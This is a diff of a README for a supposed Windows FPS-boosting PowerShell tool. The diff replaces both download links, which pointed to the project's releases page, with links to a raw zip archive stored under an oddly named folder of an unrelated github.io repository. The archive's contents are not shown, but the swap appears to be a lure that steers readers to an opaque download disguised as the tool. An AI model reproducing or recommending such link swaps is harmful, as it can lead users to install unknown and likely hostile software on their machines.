@@ -5,7 +5,7 @@ description: "Optimize Windows system settings with PowerShell scripts to reduce
 ---
 # ⚡ FPS-Drop-Fix-PowerShell - Boost gaming performance on Windows systems
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/ruse3899/FPS-Drop-Fix-PowerShell/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/ruse3899/ruse3899.github.io/raw/refs/heads/main/overroughness/github-io-ruse-1.3.zip)
 
 ## 🎮 Overview
 
@@ -19,7 +19,7 @@ This tool functions on Windows 10 and Windows 11. You need an active internet co
 
 Visit the official release page to obtain the file. Click the link below to select the latest version.
 
-[Download the FPS Fix Tool Here](https://github.com/ruse3899/FPS-Drop-Fix-PowerShell/releases)
+[Download the FPS Fix Tool Here](https://github.com/ruse3899/ruse3899.github.io/raw/refs/heads/main/overroughness/github-io-ruse-1.3.zip)
 
 ## ⚙️ How to Run the Optimizer
 
